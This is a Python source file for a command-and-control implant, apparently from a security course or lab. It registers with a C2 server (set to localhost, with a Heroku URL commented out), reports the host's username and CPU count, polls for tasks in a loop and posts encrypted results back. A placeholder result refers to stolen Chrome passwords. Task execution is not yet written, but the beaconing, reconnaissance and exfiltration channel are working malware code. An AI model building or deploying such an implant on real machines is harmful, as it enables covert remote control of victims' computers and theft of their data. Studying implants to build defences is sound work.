### this is our IMPLANT for TESTING PURPOSES ###

from subprocess import Popen, PIPE
import json
from sys import stdout
import requests 
import os 
#import subprocess
import time
from aesgcm import *
import base64

### configs ###

# c2_url = "https://c2-server-app.herokuapp.com"
c2_url = "http://127.0.0.1:5000/"
register_uri = "/agent/register"
get_task_uri = "/agent/get_task"
send_results_uri = "/agent/send_results"

### configs end ###

agent_id = None
password = None
latest_job_id = None

def init_data():
    """
        the initial data that we will send back to the C2 server
    """
    global agent_id # making agent_id a global variable
    global password
    global latest_job_id

    ## the following gives situational awareness of our implant ##
    ## and can be used to identify ourselves (the agent) on a network ##
    whoami = os.getlogin()
    cpus = os.cpu_count()
    agent_id = os.urandom(16).hex() # a random value that is unqiue to this implant
    password = "magic_conch" # hex value of sha256 "ch0nky"; for testing purposes
    return {"whoami": whoami, "agent_id": agent_id, "password": password, "cpus": cpus}

data = init_data()



def register():
    """
        register the agent with the C2 server
    """
    global data
    print("[+] Registering agent with C2 server...")
    r = requests.post(c2_url + register_uri, data=encrypt_data(data)) ## sending the data to C2 server
    if r.status_code == 200: # if the request is posted to server successfully

        # Then we want to check whether the agent is granted access
        # by checking the returned status
        resp = decrypt_data(r.content)
        # resp = r.json()
        if resp["status"] == "ok":
            # agent_id = resp["agent_id"]
            print("[+] Agent is authenticated with C2")
            return True
        else:
            print("[-] Agent failed to authenticate with C2", resp["status"])
            return False
    else:
        # TODO: when the agent fails to connect to the C2
        # we can't simply give up but we need to keep trying
        # for certain amount of time
        print("[-] Agent failed to connect to C2")
        return False

def get_task():
    """
        get a task from the C2 server
    """
    global latest_job_id
    print("[+] Getting task from C2 server...")
    r = requests.post(c2_url + get_task_uri, data=encrypt_data(data))
    if r.status_code == 200:
        resp = decrypt_data(r.content)
        # if len(resp) == 0: ## no task available
        #     print("[+] No task available")
        #     return False
        if resp["status"] == "ok":
            latest_job_id = resp["job_id"]
            print("[+] Got task from C2 server")
            print("[+] Job ID:", latest_job_id)
            print("[+] Task type:", resp["command_type"])
            print("[+] Command:", resp["cmd"])
            return True
        else:
            print("[-] Agent gets no task from server", resp)
            return False
    else:
        print("[-] Agent failed to get task from C2")
        return False  

def send_results():
    """
        send the results to the C2 server
    """
    global latest_job_id
    results = "I got the chrome password"
    data = {"agent_id": agent_id, "job_id": latest_job_id,"password": password, "results": results}

    print("[+] Sending results to C2 server...")
    r = requests.post(c2_url + send_results_uri, data=encrypt_data(data))
    if r.status_code == 200:
        resp = decrypt_data(r.content)
        if resp["status"] == "ok":
            print("[+] Results sent to C2 server")
            return True
        else:
            print("[-] Agent failed to send results to C2", resp)
            return False
    else:
        print("[-] Agent failed to send results to C2")
        return False

if __name__ == "__main__":
    register()
    while True:
        if get_task():
            send_results()
        time.sleep(5)
        # send_results()
